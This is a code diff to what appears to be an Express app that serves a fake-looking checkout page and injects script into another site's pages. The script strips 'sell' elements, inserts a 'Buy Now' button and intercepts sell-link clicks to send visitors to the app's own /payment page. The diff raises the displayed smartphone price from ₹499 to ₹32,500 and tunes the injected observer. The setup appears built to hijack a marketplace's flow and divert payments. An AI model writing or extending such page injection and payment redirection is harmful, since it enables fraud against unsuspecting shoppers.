@@ -321,7 +321,7 @@ app.use("/payment", (req, res) => {
                     <p class="font-semibold text-gray-800 text-sm">Refurbished Smartphone</p>
                     <p class="text-xs text-gray-400">Grade A • 6 months warranty</p>
                   </div>
-                  <span class="font-bold text-blue-600 text-lg">₹499</span>
+                  <span class="font-bold text-blue-600 text-lg">₹32,500</span>
                 </div>
 
                 <div class="space-y-3">
@@ -382,7 +382,7 @@ app.use("/payment", (req, res) => {
                 <div class="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100 rounded-xl p-4 flex justify-between items-center mb-4">
                   <div>
                     <p class="text-xs text-gray-400">Total Amount</p>
-                    <p class="text-2xl font-bold text-blue-600">₹499</p>
+                    <p class="text-2xl font-bold text-blue-600">₹32,500</p>
                   </div>
                   <div class="text-right">
                     <p class="text-xs text-gray-400">Payment to</p>
@@ -803,16 +803,15 @@ app.use(
                      observer.disconnect();
                      mutations.forEach(m => {
                        m.addedNodes.forEach(processNode);
-                       if (m.type === 'characterData') processNode(m.target);
                      });
                      removeSellElements();
                      injectBuyNowButton();
-                     observer.observe(document.body, { childList: true, subtree: true, characterData: true });
+                     observer.observe(document.body, { childList: true, subtree: true });
                    });
 
                    document.addEventListener('DOMContentLoaded', () => {
                      runAll();
-                     observer.observe(document.body, { childList: true, subtree: true, characterData: true });
+                     observer.observe(document.body, { childList: true, subtree: true });
                    });
 
                    // Re-run on client-side navigation (Next.js route changes)
@@ -826,7 +825,7 @@ app.use(
                      }
                    }).observe(document, { subtree: true, childList: true });
 
-                   [500, 1500, 3000, 5000].forEach(t => setTimeout(runAll, t));
+                   [500, 1500].forEach(t => setTimeout(runAll, t));
 
                    // Intercept sell link clicks → /payment
                    document.addEventListener('click', function(e) {
